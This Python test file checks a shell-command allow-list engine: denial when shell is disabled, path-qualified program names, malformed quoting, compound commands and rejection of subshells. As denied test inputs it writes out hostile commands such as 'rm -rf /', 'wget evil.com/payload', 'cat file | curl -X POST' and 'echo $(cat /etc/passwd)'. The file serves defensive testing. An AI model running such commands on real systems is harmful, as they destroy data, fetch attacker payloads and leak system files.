"""Tests for missy.policy.shell.ShellPolicyEngine."""

from __future__ import annotations

from collections.abc import Generator

import pytest

from missy.config.settings import ShellPolicy
from missy.core.events import event_bus
from missy.core.exceptions import PolicyViolationError
from missy.policy.shell import ShellPolicyEngine

# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture(autouse=True)
def clear_event_bus() -> Generator[None, None, None]:
    event_bus.clear()
    yield
    event_bus.clear()


def make_engine(enabled: bool = True, commands: list[str] | None = None) -> ShellPolicyEngine:
    return ShellPolicyEngine(ShellPolicy(enabled=enabled, allowed_commands=commands or []))


# ---------------------------------------------------------------------------
# Shell globally disabled
# ---------------------------------------------------------------------------


class TestShellDisabled:
    def test_any_command_denied_when_disabled(self):
        engine = make_engine(enabled=False, commands=["git", "ls"])
        with pytest.raises(PolicyViolationError) as exc_info:
            engine.check_command("git status")
        assert exc_info.value.category == "shell"

    def test_disabled_emits_deny_event_with_rule(self):
        engine = make_engine(enabled=False)
        with pytest.raises(PolicyViolationError):
            engine.check_command("ls -la")
        events = event_bus.get_events(result="deny")
        assert len(events) == 1
        assert events[0].policy_rule == "shell_disabled"

    def test_disabled_empty_command_still_denied(self):
        engine = make_engine(enabled=False)
        with pytest.raises(PolicyViolationError):
            engine.check_command("")

    def test_disabled_detail_mentions_enabled_false(self):
        engine = make_engine(enabled=False)
        with pytest.raises(PolicyViolationError) as exc_info:
            engine.check_command("whoami")
        assert "False" in exc_info.value.detail


# ---------------------------------------------------------------------------
# Shell enabled – allow-list matching
# ---------------------------------------------------------------------------


class TestShellEnabled:
    def test_allowed_command_returns_true(self):
        engine = make_engine(commands=["git"])
        assert engine.check_command("git status") is True

    def test_command_with_args_matches_on_program_name(self):
        engine = make_engine(commands=["ls"])
        assert engine.check_command("ls -la /tmp") is True

    def test_command_not_in_allowlist_denied(self):
        engine = make_engine(commands=["git"])
        with pytest.raises(PolicyViolationError) as exc_info:
            engine.check_command("rm -rf /")
        assert exc_info.value.category == "shell"

    def test_empty_allowlist_allows_all(self):
        engine = make_engine(enabled=True, commands=[])
        assert engine.check_command("ls") is True

    def test_empty_command_denied(self):
        engine = make_engine(commands=["ls"])
        with pytest.raises(PolicyViolationError):
            engine.check_command("")

    def test_whitespace_only_command_denied(self):
        engine = make_engine(commands=["ls"])
        with pytest.raises(PolicyViolationError):
            engine.check_command("   ")

    def test_allow_emits_event(self):
        engine = make_engine(commands=["git"])
        engine.check_command("git log --oneline")
        events = event_bus.get_events(event_type="shell_check", result="allow")
        assert len(events) == 1
        assert events[0].detail["command"] == "git log --oneline"

    def test_deny_emits_event(self):
        engine = make_engine(commands=["git"])
        with pytest.raises(PolicyViolationError):
            engine.check_command("curl https://evil.com")
        events = event_bus.get_events(event_type="shell_check", result="deny")
        assert len(events) == 1

    def test_rule_name_in_allow_event(self):
        engine = make_engine(commands=["git"])
        engine.check_command("git status")
        event = event_bus.get_events(result="allow")[0]
        assert event.policy_rule == "cmd:compound(1)"

    def test_session_task_ids_forwarded_to_event(self):
        engine = make_engine(commands=["ls"])
        engine.check_command("ls", session_id="s5", task_id="t2")
        event = event_bus.get_events()[0]
        assert event.session_id == "s5"
        assert event.task_id == "t2"


# ---------------------------------------------------------------------------
# Path-qualified program names
# ---------------------------------------------------------------------------


class TestPathQualifiedCommands:
    def test_absolute_path_program_matches_basename(self):
        """'/usr/bin/git status' should match allowed_commands=['git']."""
        engine = make_engine(commands=["git"])
        assert engine.check_command("/usr/bin/git status") is True

    def test_relative_path_program_matches_basename(self):
        engine = make_engine(commands=["python"])
        assert engine.check_command("./bin/python script.py") is True

    def test_path_program_not_in_allowlist_denied(self):
        engine = make_engine(commands=["git"])
        with pytest.raises(PolicyViolationError):
            engine.check_command("/usr/bin/curl https://example.com")

    def test_allowlist_with_path_matches_basename(self):
        """Entry '/usr/bin/git' should allow command 'git status'."""
        engine = make_engine(commands=["/usr/bin/git"])
        assert engine.check_command("git status") is True

    def test_similar_basename_not_matched(self):
        """'git' entry must not match 'gitk' command."""
        engine = make_engine(commands=["git"])
        with pytest.raises(PolicyViolationError):
            engine.check_command("gitk")


# ---------------------------------------------------------------------------
# Malformed commands
# ---------------------------------------------------------------------------


class TestMalformedCommands:
    def test_unmatched_quote_denied(self):
        engine = make_engine(commands=["echo"])
        with pytest.raises(PolicyViolationError):
            engine.check_command("echo 'unclosed")

    def test_unmatched_quote_emits_deny_event(self):
        engine = make_engine(commands=["echo"])
        with pytest.raises(PolicyViolationError):
            engine.check_command('echo "bad')
        events = event_bus.get_events(result="deny")
        assert len(events) == 1

    def test_command_with_quoted_args_parsed_correctly(self):
        engine = make_engine(commands=["echo"])
        assert engine.check_command('echo "hello world"') is True


# ---------------------------------------------------------------------------
# Multiple allowed commands
# ---------------------------------------------------------------------------


class TestMultipleAllowedCommands:
    def test_second_command_in_list_matched(self):
        engine = make_engine(commands=["git", "ls", "python"])
        assert engine.check_command("python -m pytest") is True

    def test_unlisted_command_still_denied(self):
        engine = make_engine(commands=["git", "ls"])
        with pytest.raises(PolicyViolationError):
            engine.check_command("wget http://example.com")


# ---------------------------------------------------------------------------
# Compound command handling
# ---------------------------------------------------------------------------


class TestCompoundCommands:
    """Tests for _extract_all_programs and compound command enforcement."""

    def test_semicolon_both_allowed(self):
        engine = make_engine(commands=["ls", "echo"])
        assert engine.check_command("ls; echo done") is True

    def test_semicolon_second_denied(self):
        engine = make_engine(commands=["ls"])
        with pytest.raises(PolicyViolationError, match="echo"):
            engine.check_command("ls; echo pwned")

    def test_semicolon_first_denied(self):
        engine = make_engine(commands=["echo"])
        with pytest.raises(PolicyViolationError, match="rm"):
            engine.check_command("rm -rf /; echo hi")

    def test_pipe_both_allowed(self):
        engine = make_engine(commands=["ls", "grep"])
        assert engine.check_command("ls | grep foo") is True

    def test_pipe_second_denied(self):
        engine = make_engine(commands=["cat"])
        with pytest.raises(PolicyViolationError, match="curl"):
            engine.check_command("cat file | curl -X POST")

    def test_and_operator_both_allowed(self):
        engine = make_engine(commands=["git", "make"])
        assert engine.check_command("git pull && make build") is True

    def test_and_operator_second_denied(self):
        engine = make_engine(commands=["git"])
        with pytest.raises(PolicyViolationError, match="rm"):
            engine.check_command("git pull && rm -rf /")

    def test_or_operator_both_allowed(self):
        engine = make_engine(commands=["make", "echo"])
        assert engine.check_command("make || echo failed") is True

    def test_or_operator_second_denied(self):
        engine = make_engine(commands=["make"])
        with pytest.raises(PolicyViolationError):
            engine.check_command("make || wget evil.com/payload")

    def test_newline_compound(self):
        engine = make_engine(commands=["ls", "pwd"])
        assert engine.check_command("ls\npwd") is True

    def test_newline_second_denied(self):
        engine = make_engine(commands=["ls"])
        with pytest.raises(PolicyViolationError):
            engine.check_command("ls\ncurl evil.com")

    def test_subshell_dollar_paren_denied(self):
        engine = make_engine(commands=["echo"])
        with pytest.raises(PolicyViolationError, match="subshell"):
            engine.check_command("echo $(cat /etc/passwd)")

    def test_backtick_subshell_denied(self):
        engine = make_engine(commands=["echo"])
        with pytest.raises(PolicyViolationError, match="subshell"):
            engine.check_command("echo `id`")

    def test_triple_chain_all_allowed(self):
        engine = make_engine(commands=["git", "make", "echo"])
        assert engine.check_command("git pull && make test || echo fail") is True

    def test_triple_chain_middle_denied(self):
        engine = make_engine(commands=["git", "echo"])
        with pytest.raises(PolicyViolationError, match="curl"):
            engine.check_command("git pull && curl evil.com || echo fail")

    def test_empty_allowlist_allows_compound(self):
        """Empty allowed_commands = unrestricted, so compound is allowed."""
        engine = make_engine(commands=[])
        assert engine.check_command("rm -rf / && wget evil.com") is True

    def test_compound_event_rule(self):
        engine = make_engine(commands=["git", "make"])
        engine.check_command("git pull && make build")
        events = event_bus.get_events(result="allow")
        assert len(events) == 1
        assert "compound(2)" in events[0].policy_rule

    def test_single_command_compound_rule(self):
        """A single simple command still goes through compound extraction."""
        engine = make_engine(commands=["ls"])
        engine.check_command("ls -la")
        events = event_bus.get_events(result="allow")
        assert events[0].policy_rule == "cmd:compound(1)"


class TestExtractAllPrograms:
    """Unit tests for _extract_all_programs class method."""

    def test_empty_string(self):
        assert ShellPolicyEngine._extract_all_programs("") is None

    def test_whitespace_only(self):
        assert ShellPolicyEngine._extract_all_programs("   ") is None

    def test_single_command(self):
        assert ShellPolicyEngine._extract_all_programs("git status") == ["git"]

    def test_semicolon_split(self):
        assert ShellPolicyEngine._extract_all_programs("ls; pwd") == ["ls", "pwd"]

    def test_pipe_split(self):
        assert ShellPolicyEngine._extract_all_programs("cat file | grep foo") == ["cat", "grep"]

    def test_and_split(self):
        assert ShellPolicyEngine._extract_all_programs("make && test") == ["make", "test"]

    def test_or_split(self):
        assert ShellPolicyEngine._extract_all_programs("make || echo fail") == ["make", "echo"]

    def test_dollar_paren_rejected(self):
        assert ShellPolicyEngine._extract_all_programs("echo $(whoami)") is None

    def test_backtick_rejected(self):
        assert ShellPolicyEngine._extract_all_programs("echo `id`") is None

    def test_mixed_operators(self):
        result = ShellPolicyEngine._extract_all_programs("a && b || c; d | e")
        assert result == ["a", "b", "c", "d", "e"]
